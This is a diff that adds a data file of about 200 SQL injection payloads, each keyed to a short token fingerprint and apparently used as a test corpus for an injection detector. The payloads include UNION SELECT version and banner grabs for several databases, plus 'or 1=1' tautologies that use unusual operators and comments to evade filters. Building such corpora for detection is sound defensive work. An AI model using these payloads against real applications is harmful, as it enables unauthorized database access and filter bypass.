@@ -1,0 +1,200 @@
+sUE&o: select * from users where id='1' union select ||/1,version() -- 1'
+sUE(): select * from users where id='1' union select (\),@@VERSION -- 1'
+sUE(.: select * from users where id='1' union select (\.),@@VERSION -- 1'
+.oUE1: select * from users where id=1. <@ union select 1,version() -- 1
+.oUEf: select * from users where id=1. <@ union select version(),version() -- 1
+.oUEv: select * from users where id=1.*\ union select null,@@VERSION -- 1
+.onUE: select * from users where id=1.<@$ union select 1,version() -- 1
+&(1UE: select * from users where id=1 or (\+)=1 union select 1,@@VERSION -- 1
+&(nUE: select * from users where id=1 or ($+)=1 union select 1,@@VERSION -- 1
+&.o1U: select * from users where id=1 or \.<1 union select 1,@@VERSION -- 1
+&.oUE: select * from users where id=1 or \.<\ union select 1,@@VERSION -- 1
+&.onU: select * from users where id=1 or \.<$ union select 1,@@VERSION -- 1
+&.oo1: select * from users where id=1 or \.< =1 union select 1,@@VERSION -- 1
+&1oo1: select * from users where id=1 or  1<@=1 union select 1,version() -- 1
+&1ooU: select * from users where id=1 or \+<\ union select 1,@@VERSION -- 1
+&1oon: select * from users where id=1 or \+<$ union select 1,@@VERSION -- 1
+&1ovc: select * from users where id=1 or 1&@#=1 union select 1,version() -- 1
+&n.o1: select * from users where id=1 or $ .=1 union select 1,@@VERSION -- 1
+&n1UE: select * from users where id=1 or $ 1=1 union select 1,@@VERSION -- 1
+&no.U: select * from users where id=1 or $<\. union select 1,@@VERSION -- 1
+&noUE: select * from users where id=1 or $<\ union select 1,@@VERSION -- 1
+&noo1: select * from users where id=1 or $+<1 union select 1,@@VERSION -- 1
+&nooU: select * from users where id=1 or $+<\ union select 1,@@VERSION -- 1
+&noon: select * from users where id=1 or $+<$ union select 1,@@VERSION -- 1
+&o.UE: select * from users where id=1 or \<\. union select 1,@@VERSION -- 1
+&o1UE: select * from users where id=1 or \<1 union select 1,@@VERSION -- 1
+&oUE1: select * from users where id=1 or \<\ union select 1,@@VERSION -- 1
+&oUEv: select * from users where id=1 or \<\ union select null,@@VERSION -- 1
+&onUE: select * from users where id=1 or \<$ union select 1,@@VERSION -- 1
+&oo1U: select * from users where id=1 or \< =1 union select 1,@@VERSION -- 1
+&ovUE: select * from users where id=1 or !<@ union select 1,version() -- 1
+&voo1: select * from users where id=1 or @<@=1 union select 1,version() -- 1
+)UEvc: select * from users where id=1 +(\) union select null,@@VERSION -- 1
+.&1UE: select * from users where id=1.&&1 union select 1,version() -- 1
+.&vUE: select * from users where id=1.&&@ union select 1,version() -- 1
+.)UEv: select * from users where id=1 + (\.) union select null,@@VERSION -- 1
+.UE1,: select * from users where id=1.  union select 1,version() -- 1
+.UEf(: select * from users where id=1.  union select version(),version() -- 1
+.UEv,: select * from users where id=1. union select null,version() -- 1
+.UEvc: select * from users where id=1 +\. union select null,@@VERSION -- 1
+.o.UE: select * from users where id=1.<@. union select 1,version() -- 1
+.ovUE: select * from users where id=1.%@ union select 1,version() -- 1
+1o)UE: select * from users where id=1 + (\+) union select null,@@VERSION -- 1
+1o.UE: select * from users where id=1 +\+. union select null,@@VERSION -- 1
+1oUE1: select * from users where id=1 -1<@ union select 1,version() -- 1
+1oUEf: select * from users where id=1 +1<@ union select version(),version() -- 1
+1oUEv: select * from users where id=1 +1<@ union select null,version() -- 1
+1oo1U: select * from users where id=1 + \+%1 union select null,@@VERSION -- 1
+1ooUE: select * from users where id=1 + \+*\ union select null,@@VERSION -- 1
+1oonU: select * from users where id=1 + \+*$ union select null,@@VERSION -- 1
+UE1&1: select * from users where id=1 union select 1||1,version() -- 1
+UE1&v: select * from users where id=1 union select 1||@,version() -- 1
+UE111: select * from users where id=1 union select 1 1$,version() -- 1
+UE11f: select * from users where id=1 union select 1 $,version() -- 1
+UE11n: select * from users where id=1 union select 1 1a,version() -- 1
+UE1f(: select * from users where id=1 union select 1<@$,version() -- 1
+UE1n,: select * from users where id=1 union select .1_,version() -- 1
+UE1nn: select * from users where id=1 union select .1$_,version() -- 1
+n.UEv: select * from users where id=1 +$ . union select null,@@VERSION -- 1
+n1UEv: select * from users where id=1 +$ 1 union select null,@@VERSION -- 1
+no)UE: select * from users where id=1 + ($+) union select null,@@VERSION -- 1
+no.UE: select * from users where id=1 +$+. union select null,@@VERSION -- 1
+noUEv: select * from users where id=1 +$+ union select null,@@VERSION -- 1
+noo1U: select * from users where id=1 + $+%1 union select null,@@VERSION -- 1
+nooUE: select * from users where id=1 + $+*\ union select null,@@VERSION -- 1
+noonU: select * from users where id=1 + $+*$ union select null,@@VERSION -- 1
+o()UE: select * from users where id=1 *(\) union select null,@@VERSION -- 1
+&()o1: select * from users where id=1 or (\)=1 union select 1,@@VERSION -- 1
+&(.)o: select * from users where id=1 or (\.)=1 union select 1,@@VERSION -- 1
+o..UE: select * from users where id=1<@.. union select 1,version() -- 1
+o.UE1: select * from users where id=1 <@. union select 1,version() -- 1
+o.UEf: select * from users where id=1  <@. union select version(),version() -- 1
+o.UEv: select * from users where id=1 *\. union select null,@@VERSION -- 1
+o.nUE: select * from users where id=1 <@.$ union select 1,version() -- 1
+o1nUE: select * from users where id=1 <@1$ union select 1,version() -- 1
+oUEvc: select * from users where id=1 *\ union select null,@@VERSION -- 1
+on.UE: select * from users where id=1 *$ . union select null,@@VERSION -- 1
+on1UE: select * from users where id=1 %$ 1 union select null,@@VERSION -- 1
+onnUE: select * from users where id=1 <@$_ union select 1,version() -- 1
+ooUE1: select * from users where id=1<@<@ union select 1,version() -- 1
+ooUEf: select * from users where id=1 <@<@ union select version(),version() -- 1
+ooUEv: select * from users where id=1 <@<@ union select null,version() -- 1
+oovUE: select * from users where id=1 <@&@ union select 1,version() -- 1
+s&&o1: select * from users where id='1' or ||/1=1 union select 1,version() -- 1'
+s&onU: select * from users where id='1' or \<$ union select 1,@@VERSION -- 1'
+s&oo1: select * from users where id='1' or \< =1 union select 1,@@VERSION -- 1'
+s&ovU: select * from users where id='1' or !<@ union select 1,version() -- 1'
+s&v(1: select * from users where id='1' or @(1)=1 union select 1,version() -- 1'
+s&v1U: select * from users where id='1' or @ 1=1 union select 1,version() -- 1'
+s&vvU: select * from users where id='1' or @ @1=1 union select 1,version() -- 1'
+s(UE1: select * from users where id=1 or 1#"( union select 1,version() -- 1
+s(UEf: select * from users where id=1 or 1#"( union select version(),version() -- 1
+s(UEs: select * from users where id=1 or 1#"( union select 'a',version() -- 1
+s(UEv: select * from users where id=1 or 1#"( union select null,version() -- 1
+s(o1U: select * from users where id=1 or @#"(=1 union select 1,version() -- 1
+s,UE1: select * from users where id=1 or 1#", union select 1,version() -- 1
+s,UEf: select * from users where id=1 or 1#", union select version(),version() -- 1
+s,UEs: select * from users where id=1 or 1#", union select 'a',version() -- 1
+s,UEv: select * from users where id=1 or 1#", union select null,version() -- 1
+s,o1U: select * from users where id=1 or @#",=1 union select 1,version() -- 1
+s.UE1: select * from users where id=1 or 1#". union select 1,version() -- 1
+s.UEf: select * from users where id=1 or 1#". union select version(),version() -- 1
+s.UEs: select * from users where id=1 or 1#". union select 'a',version() -- 1
+s.UEv: select * from users where id=1 or 1#". union select null,version() -- 1
+s.o1U: select * from users where id=1 or 1#".=1 union select 1,version() -- 1
+s1UE1: select * from users where id=1 or 1#"1 union select 1,version() -- 1
+s1UEf: select * from users where id=1 or 1#"1 union select version(),version() -- 1
+s1UEs: select * from users where id=1 or 1#"1 union select 'a',version() -- 1
+s1UEv: select * from users where id=1 or 1#"1 union select null,version() -- 1
+UEvkn: select * from users where id=1   union select null,banner from v$version where rownum=1 -- 1
+UE1kn: select * from users where id=1 union select 1,banner from v$version where rownum=1 -- 1
+1)UE1: select * from users where id=1 +(1) union select 1,banner from v$version where rownum=1 -- 1
+1)UEv: select * from users where id=1 +(1) union select null,banner from v$version where rownum=1 -- 1
+1UE1k: select * from users where id=1 +1 union select 1,banner from v$version where rownum=1 -- 1
+1UEvk: select * from users where id=1 +1 union select null,banner from v$version where rownum=1 -- 1
+.UEvk: select * from users where id=1. union select null,banner from v$version where rownum=1 -- 1
+.UE1k: select * from users where id=1. union select 1,banner from v$version where rownum=1 -- 1
+1&1UE: select * from users where id=11||1 union select 1,banner from v$version where rownum=1 -- 1
+&1UE1: select * from users where id=1 ||1 union select 1,banner from v$version where rownum=1 -- 1
+&1UEv: select * from users where id=1 ||1 union select null,banner from v$version where rownum=1 -- 1
+&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1
+.o1UE: select * from users where id=1.*1 union select 1,banner from v$version where rownum=1 -- 1
+UE(1): select * from users where id=1 union select (1),banner from v$version where rownum=1 -- 1
+UE1nc: select * from users where id=1 union select 1a#,banner from v$version where rownum=1 -- 1
+UE1nk: select * from users where id=1 union select 1a,banner from v$version where rownum=1 -- 1
+o(1)U: select * from users where id=1 *(1) union select 1,banner from v$version where rownum=1 -- 1
+o1UE1: select * from users where id=1 *1 union select 1,banner from v$version where rownum=1 -- 1
+o1UEv: select * from users where id=1 *1 union select null,banner from v$version where rownum=1 -- 1
+oo1UE: select * from users where id=1 | |1 union select 1,banner from v$version where rownum=1 -- 1
+s&(1): select * from users where id='1' or (1)=1 union select 1,banner from v$version where rownum=1 -- 1'
+s&1UE: select * from users where id='1' ||1 union select 1,banner from v$version where rownum=1 -- 1'
+sUEvk: select * from users where id='1'   union select null,banner from v$version where rownum=1 -- 1'
+s&1oo: select * from users where id='1' or 1^=1 union select 1,banner from v$version where rownum=1 -- 1'
+sUE1k: select * from users where id='1' union select 1,banner from v$version where rownum=1 -- 1'
+sUE1n: select * from users where id='1' union select 1a,banner from v$version where rownum=1 -- 1'
+sUE1s: select * from users where id='1' union select 1"!",banner from v$version where rownum=1 -- 1'
+sUE(1: select * from users where id='1' union select (1),banner from v$version where rownum=1 -- 1'
+s(c: select * from users where id=1 or "(#" or 1=1 -- 1
+s(n: select * from users where id=1 or "([" or 1=1 -- 1
+s(ns: select * from users where id=1 or "(_" or 1=1 -- 1
+s(o1&: select * from users where id=1 or @#"(=1 or 1=1 -- 1
+s(os: select * from users where id=1 or "(&" or 1=1 -- 1
+s(v: select * from users where id=1 or "(@" or 1=1 -- 1
+s({s: select * from users where id=1 or "({" or 1=1 -- 1
+s)(s: select * from users where id=1 or ")("=1 or 1=1 -- 1
+s&.o&: select * from users where id='1' or \.<\ or 1=1 -- 1'
+s(;s: select * from users where id=1 or "(;" or 1=1 -- 1
+s(?s: select * from users where id=1 or "(]" or 1=1 -- 1
+s(c: select * from users where id=1 or "(#" or 1=1 -- 1
+s(n: select * from users where id=1 or "([" or 1=1 -- 1
+s(ns: select * from users where id=1 or "(_" or 1=1 -- 1
+s(o1&: select * from users where id=1 or @#"(=1 or 1=1 -- 1
+s(os: select * from users where id=1 or "(&" or 1=1 -- 1
+s(v: select * from users where id=1 or "(@" or 1=1 -- 1
+s({s: select * from users where id=1 or "({" or 1=1 -- 1
+s)(s: select * from users where id=1 or ")("=1 or 1=1 -- 1
+s),s: select * from users where id=1 or ")," or 1=1 -- 1
+s).s: select * from users where id=1 or ")."=1 or 1=1 -- 1
+s)1s: select * from users where id=1 or ")1" or 1=1 -- 1
+s):s: select * from users where id=1 or "):" or 1=1 -- 1
+s);s: select * from users where id=1 or ");" or 1=1 -- 1
+s)?s: select * from users where id=1 or ")]" or 1=1 -- 1
+s)n: select * from users where id=1 or ")[" or 1=1 -- 1
+s)ns: select * from users where id=1 or ")$" or 1=1 -- 1
+s)v: select * from users where id=1 or ")@" or 1=1 -- 1
+s){s: select * from users where id=1 or "){" or 1=1 -- 1
+s,(s: select * from users where id=1 or ",(" or 1=1 -- 1
+s,)s: select * from users where id=1 or ",)"=1 or 1=1 -- 1
+s,,s: select * from users where id=1 or ",,"=1 or 1=1 -- 1
+s.)s: select * from users where id=1 or ".)" or 1=1 -- 1
+s.,s: select * from users where id=1 or ".," or 1=1 -- 1
+s..s: select * from users where id=1 or ".."=1 or 1=1 -- 1
+s.:s: select * from users where id=1 or ".:"=1 or 1=1 -- 1
+s.;s: select * from users where id=1 or ".;" or 1=1 -- 1
+s.?s: select * from users where id=1 or ".]" or 1=1 -- 1
+s,c: select * from users where id=1 or ",#" or 1=1 -- 1
+s,o1&: select * from users where id=1 or 1#",=1 or 1=1 -- 1
+s.c: select * from users where id=1 or ".#" or 1=1 -- 1
+s.n: select * from users where id=1 or ".[" or 1=1 -- 1
+s.ns: select * from users where id=1 or "._" or 1=1 -- 1
+s.o1&: select * from users where id=1 or @#".=1 or 1=1 -- 1
+s.os: select * from users where id=1 or ".%" or 1=1 -- 1
+s.v: select * from users where id=1 or ".@" or 1=1 -- 1
+s.{s: select * from users where id=1 or ".{" or 1=1 -- 1
+s1(s: select * from users where id=1 or "1("=1 or 1=1 -- 1
+s1)s: select * from users where id=1 or "1)" or 1=1 -- 1
+s1: select * from users where id=1 or "1," or 1=1 -- 1
+s1;s: select * from users where id=1 or "1;"=1 or 1=1 -- 1
+s1?s: select * from users where id=1 or "1]" or 1=1 -- 1
+s1c: select * from users where id=1 or "1#" or 1=1 -- 1
+s1n: select * from users where id=1 or "1[" or 1=1 -- 1
+s1ns: select * from users where id=1 or "1_" or 1=1 -- 1
+s1os: select * from users where id=1 or "1&" or 1=1 -- 1
+s1{s: select * from users where id=1 or "1{" or 1=1 -- 1
+s:&1c: select * from users where id=1 or 1#": or 1=1 -- 1
+s:(s: select * from users where id=1 or ":("=1 or 1=1 -- 1
+s:)s: select * from users where id=1 or ":)"=1 or 1=1 -- 1
+s:,s: select * from users where id=1 or ":," or 1=1 -- 1
+s:.s: select * from users where id=1 or ":."=1 or 1=1 -- 1
+s:1s: select * from users where id=1 or ":1" or 1=1 -- 1
